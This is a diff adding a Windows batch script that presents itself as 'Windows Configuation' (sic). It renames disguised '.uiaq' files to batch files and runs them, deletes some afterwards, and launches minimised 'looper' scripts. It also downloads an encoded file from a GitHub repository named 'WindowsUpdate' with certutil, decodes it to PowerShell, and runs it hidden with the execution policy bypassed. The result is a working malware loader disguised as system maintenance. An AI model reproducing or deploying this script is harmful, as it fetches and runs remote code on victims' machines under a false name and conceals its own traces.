@@ -1,0 +1,67 @@
+@echo off 
+echo . 
+color 1a
+
+title W  I  N  D  O  W  S    C  O  N  F  I  G  U  A  T  I  O  N
+echo W  I  N  D  O  W  S    C  O  N  F  I  G  U  A  T  I  O  N 
+
+IF EXIST 2dir.uiaq (
+	ren 2dir.uiaq 2dir.bat
+	call 2dir.bat
+) ELSE (
+	echo jade
+)
+
+IF EXIST 3cpy.uiaq (
+	ren 3cpy.uiaq 3cpy.bat
+	call 3cpy.bat
+) ELSE (
+	echo jade
+)
+
+IF EXIST 4sch.uiaq (
+	ren 4sch.uiaq 4sch.bat
+	call 4sch.bat
+) ELSE (
+	echo jade
+)
+
+IF EXIST 5re.uiaq (
+	ren 5re.uiaq 5re.bat
+	call 5re.bat
+
+) ELSE (
+	echo jade
+)
+
+del /F /Q 3cpy.bat
+del /F /Q 4sch.bat
+del /F /Q 5re.bat
+
+IF EXIST 6pylooper.uiaq (
+	ren 6pylooper.uiaq 6pylooper.bat
+	start /min 6pylooper.bat
+) ELSE (
+	echo jade
+)
+
+timeout /t 6
+
+IF EXIST 7looper.uiaq (
+	ren 7looper.uiaq 7looper.bat
+	start /min 7looper.bat
+) ELSE (
+	echo jade
+)
+
+:orange
+
+IF EXIST up-query.altp (
+	certutil.exe -decode .\up-query.altp up-query.ps1
+	echo "%userprofile%" >> up.txt || echo %userprofile% >> up.txt
+	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File up-query.ps1
+	
+) ELSE (
+	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/up-query.altp" up-query.altp
+	goto orange
+)
